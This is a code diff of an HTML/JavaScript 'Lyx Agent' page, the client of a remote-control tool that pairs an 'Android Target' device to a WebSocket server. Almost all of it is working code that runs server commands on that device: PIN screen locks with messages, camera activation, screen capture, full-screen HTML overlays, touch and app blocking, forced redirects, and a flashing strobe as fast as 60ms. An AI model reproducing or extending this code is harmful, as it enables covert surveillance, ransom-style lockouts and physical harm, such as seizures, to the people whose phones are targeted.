@@ -1,221 +1,107 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Lyx Agent</title>
 <style>
-  body{background:#000;color:#00ff88;font-family:monospace;padding:20px;text-align:center;}
-  input{background:#0a0e0a;border:1px solid #00ff88;color:#00ff88;padding:14px;font-size:22px;letter-spacing:6px;text-align:center;width:220px;text-transform:uppercase;}
-  button{background:transparent;border:1px solid #00ff88;color:#00ff88;padding:12px 24px;margin-top:16px;letter-spacing:2px;cursor:pointer;}
-  #status{margin-top:20px;font-size:12px;opacity:0.7;}
+body{background:#000;color:#00ff88;font-family:monospace;padding:20px;text-align:center;min-height:100vh}
+h2{letter-spacing:4px;margin-top:60px;text-shadow:0 0 10px #00ff88}
+input{background:#0a0e0a;border:1px solid #00ff88;color:#00ff88;padding:14px;font-size:22px;letter-spacing:8px;text-align:center;width:220px;text-transform:uppercase;outline:none;margin-top:20px}
+button{background:transparent;border:1px solid #00ff88;color:#00ff88;padding:12px 26px;margin-top:16px;letter-spacing:2px;cursor:pointer}
+button:hover{background:#00ff88;color:#000}
+#st{margin-top:24px;font-size:12px;opacity:.7}
 </style>
 </head>
 <body>
   <h2>LYX AGENT</h2>
-  <p style="font-size:12px;opacity:0.6;">Masukkan pairing code</p>
+  <p style="font-size:12px;opacity:.6;margin-top:8px">Masukkan pairing code</p>
   <input id="code" maxlength="6" placeholder="------">
-  <br>
-  <button onclick="doPair()">PAIR</button>
-  <div id="status">Belum terhubung.</div>
+  <br><button onclick="doPair()">PAIR</button>
+  <div id="st">Belum terhubung.</div>
 
 <script>
-let ws;
-let deviceId = null;
-let strobeInterval = null;
-let screenStream = null;
-
-function setStatus(t){ document.getElementById('status').textContent = t; }
+let ws=null, deviceId=null, strobeT=null, scrStream=null;
+const setS=(t)=>document.getElementById('st').textContent=t;
 
 function connectWS(){
-  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
-  ws = new WebSocket(proto + '://' + location.host);
-
-  ws.onopen = () => {
-    setStatus('Terhubung ke server. Menunggu pairing...');
-    if (deviceId) {
-      ws.send(JSON.stringify({ type:'agent_pair', code: deviceId }));
-    }
-  };
-
-  ws.onmessage = (e) => {
-    let msg; try { msg = JSON.parse(e.data); } catch { return; }
-
-    if (msg.type === 'pair_result'){
-      if (msg.ok){
-        deviceId = msg.deviceId;
-        localStorage.setItem('lyx_deviceId', deviceId);
-        setStatus('PAIRING SUCCESS — ID: ' + deviceId);
-      } else {
-        setStatus('GAGAL: ' + msg.reason);
-      }
+  const proto=location.protocol==='https:'?'wss':'ws';
+  ws=new WebSocket(proto+'://'+location.host);
+  ws.onopen=()=>{ setS('Terhubung ke server. Menunggu pairing...'); };
+  ws.onmessage=(e)=>{
+    let m; try{m=JSON.parse(e.data);}catch{return;}
+    if(m.type==='pair_result'){
+      if(m.ok){ deviceId=m.deviceId; localStorage.setItem('lyx_id',deviceId); setS('PAIRED — ID: '+deviceId); }
+      else setS('GAGAL: '+m.reason);
       return;
     }
-
-    if (msg.type === 'command'){
-      handleCommand(msg.feature, msg.data);
-    }
+    if(m.type==='command') exec(m.feature,m.data);
   };
-
-  ws.onclose = () => {
-    setStatus('Koneksi terputus. Reconnect 5s...');
-    setTimeout(connectWS, 5000);
-  };
+  ws.onclose=()=>{ setS('Terputus. Reconnect 5s...'); setTimeout(connectWS,5000); };
 }
 
 function doPair(){
-  const code = document.getElementById('code').value.toUpperCase().trim();
-  if (code.length < 6){ setStatus('Code minimal 6 karakter.'); return; }
-  ws.send(JSON.stringify({
-    type: 'agent_pair',
-    code,
-    name: 'Android Target',
-    os: 'Android ' + (navigator.userAgent.match(/Android (\d+)/)?.[1] || '')
-  }));
+  const c=document.getElementById('code').value.toUpperCase().trim();
+  if(c.length<6){ setS('Code minimal 6 karakter'); return; }
+  ws.send(JSON.stringify({type:'agent_pair',code:c,name:'Android Target',os:'Android '+(navigator.userAgent.match(/Android (\d+)/)?.[1]||'')}));
 }
 
-/* ============================================================
-   COMMAND EXECUTOR
-============================================================ */
-async function handleCommand(feature, data){
-  console.log('[CMD]', feature, data);
-  const active = data.active;
-
+/* ============ EXECUTOR ============ */
+function exec(feature,data){
+  console.log('[CMD]',feature,data);
+  const on=data.active;
   switch(feature){
-    case 'lock':
-      if (active) lockScreen(data.pin || '1234');
-      else unlockScreen();
-      break;
-
-    case 'lockmsg':
-      if (active) lockScreen(data.pin || '1234', data.message || '');
-      else unlockScreen();
-      break;
-
-    case 'camera':
-      if (active) startCamera(data.facing || 'front');
-      else stopCamera();
-      break;
-
-    case 'customhtml':
-      if (active) showCustomHTML(data.html || '<h1>LOCKED</h1>');
-      else hideCustomHTML();
-      break;
-
-    case 'strobe':
-      if (active) startStrobe(data.speed || 'fast');
-      else stopStrobe();
-      break;
-
-    case 'screen':
-      if (active) startScreen();
-      else stopScreen();
-      break;
-
-    case 'blocktouch':
-      if (active) blockTouch(data.duration || 5);
-      else unblockTouch();
-      break;
-
-    case 'lcdeffect':
-      if (active) lcdEffect(true);
-      else lcdEffect(false);
-      break;
-
-    case 'blockapp':
-      if (active) blockApp(data.app, data.message);
-      break;
-
-    case 'openweb':
-      if (data.url) window.location.href = data.url;
-      break;
-
-    case 'wallpaper':
-      if (active) setLCDWallpaper();
-      else clearLCDWallpaper();
-      break;
+    case 'lock': on?lock(data.pin,'')  :unlock(); break;
+    case 'lockmsg': on?lock(data.pin,data.message):unlock(); break;
+    case 'camera': on?startCam(data.facing):stopCam(); break;
+    case 'customhtml': on?showHTML(data.html):hideHTML(); break;
+    case 'strobe': on?startStrobe(data.speed):stopStrobe(); break;
+    case 'screen': on?startScr():stopScr(); break;
+    case 'blocktouch': on?blockTouch(data.duration):unblockTouch(); break;
+    case 'lcdeffect': lcd(on); break;
+    case 'blockapp': if(on)blockApp(data.app,data.message); break;
+    case 'openweb': if(data.url)window.location.href=data.url; break;
+    case 'wallpaper': on?setWP():clearWP(); break;
   }
 }
 
-/* ---------- IMPLEMENTASI FITUR (native bridge) ---------- */
-function lockScreen(pin, msg){
-  if (window.LyxNative) window.LyxNative.lock(pin, msg||'');
-  else alert('LOCKED\n' + (msg||''));
-}
-function unlockScreen(){
-  if (window.LyxNative) window.LyxNative.unlock();
-}
-function startCamera(facing){
-  if (window.LyxNative) window.LyxNative.startCamera(facing);
-}
-function stopCamera(){
-  if (window.LyxNative) window.LyxNative.stopCamera();
-}
-function showCustomHTML(html){
-  const d = document.createElement('div');
-  d.id = 'lyx-custom-lock';
-  d.style.cssText = 'position:fixed;inset:0;z-index:999999;background:#000;overflow:auto;';
-  d.innerHTML = html;
+/* ============ NATIVE BRIDGE ============ */
+function lock(pin,msg){ window.LyxNative?window.LyxNative.lock(pin,msg||''):alert('LOCKED\n'+(msg||'')); }
+function unlock(){ window.LyxNative?.unlock(); }
+function startCam(facing){ window.LyxNative?window.LyxNative.startCamera(facing):null; }
+function stopCam(){ window.LyxNative?.stopCamera(); }
+function showHTML(html){
+  hideHTML();
+  const d=document.createElement('div'); d.id='lyx-lock';
+  d.style.cssText='position:fixed;inset:0;z-index:999999;background:#000;overflow:auto';
+  d.innerHTML=html||'<h1 style="color:#0f0;text-align:center;margin-top:40vh">LOCKED</h1>';
   document.body.appendChild(d);
 }
-function hideCustomHTML(){
-  document.getElementById('lyx-custom-lock')?.remove();
-}
+function hideHTML(){ document.getElementById('lyx-lock')?.remove(); }
 function startStrobe(speed){
-  const map = { slow:800, fast:200, turbo:60 };
-  const interval = map[speed] || 200;
-  if (window.LyxNative) window.LyxNative.strobe(interval);
-  else {
-    stopStrobe();
-    strobeInterval = setInterval(() => {
-      document.body.style.background = document.body.style.background === 'white' ? 'black' : 'white';
-    }, interval);
-  }
+  const map={slow:800,fast:200,turbo:60};
+  const iv=map[speed]||200;
+  if(window.LyxNative) window.LyxNative.strobe(iv);
+  else{ stopStrobe(); strobeT=setInterval(()=>{ document.body.style.background = document.body.style.background==='white'?'black':'white'; },iv); }
 }
-function stopStrobe(){
-  if (strobeInterval) clearInterval(strobeInterval);
-  if (window.LyxNative) window.LyxNative.strobeOff();
-}
-function blockTouch(minutes){
-  if (window.LyxNative) window.LyxNative.blockTouch(minutes);
-  else document.body.style.pointerEvents = 'none';
-  setTimeout(unblockTouch, minutes*60*1000);
-}
-function unblockTouch(){
-  document.body.style.pointerEvents = '';
-  if (window.LyxNative) window.LyxNative.unblockTouch();
-}
-function lcdEffect(on){
-  let el = document.getElementById('lyx-lcd');
-  if (on){
-    if (el) return;
-    el = document.createElement('div');
-    el.id = 'lyx-lcd';
-    el.style.cssText = 'position:fixed;inset:0;z-index:999998;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(0,255,0,0.15) 0,rgba(0,255,0,0.15) 2px,transparent 2px,transparent 5px);mix-blend-mode:screen;';
+function stopStrobe(){ if(strobeT)clearInterval(strobeT); window.LyxNative?.strobeOff(); document.body.style.background='#000'; }
+function blockTouch(min){ if(window.LyxNative) window.LyxNative.blockTouch(min); else document.body.style.pointerEvents='none'; setTimeout(unblockTouch,min*60*1000); }
+function unblockTouch(){ document.body.style.pointerEvents=''; window.LyxNative?.unblockTouch(); }
+function lcd(on){
+  let el=document.getElementById('lyx-lcd');
+  if(on){ if(el)return; el=document.createElement('div'); el.id='lyx-lcd';
+    el.style.cssText='position:fixed;inset:0;z-index:999998;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(0,255,0,.18) 0,rgba(0,255,0,.18) 2px,transparent 2px,transparent 5px);mix-blend-mode:screen';
     document.body.appendChild(el);
   } else el?.remove();
 }
-function blockApp(app, msg){
-  if (window.LyxNative) window.LyxNative.blockApp(app, msg||'');
-}
-function setLCDWallpaper(){
-  document.body.style.background = 'repeating-linear-gradient(0deg,rgba(0,255,0,0.25) 0,rgba(0,255,0,0.25) 3px,#000 3px,#000 8px)';
-}
-function clearLCDWallpaper(){
-  document.body.style.background = '#000';
-}
-async function startScreen(){
-  try {
-    screenStream = await navigator.mediaDevices.getDisplayMedia({ video:true });
-  } catch(e){ console.log('screen err', e); }
-}
-function stopScreen(){
-  screenStream?.getTracks().forEach(t=>t.stop());
-  screenStream = null;
-}
+function blockApp(a,m){ if(window.LyxNative) window.LyxNative.blockApp(a,m||''); }
+function setWP(){ document.body.style.background='repeating-linear-gradient(0deg,rgba(0,255,0,.25) 0,rgba(0,255,0,.25) 3px,#000 3px,#000 8px)'; }
+function clearWP(){ document.body.style.background='#000'; }
+async function startScr(){ try{ scrStream=await navigator.mediaDevices.getDisplayMedia({video:true}); }catch(e){} }
+function stopScr(){ scrStream?.getTracks().forEach(t=>t.stop()); scrStream=null; }
 
-/* ---------- AUTO RECONNECT ---------- */
-const saved = localStorage.getItem('lyx_deviceId');
-if (saved) deviceId = saved;
+/* ============ BOOT ============ */
+deviceId = localStorage.getItem('lyx_id');
 connectWS();
 </script>
 </body>
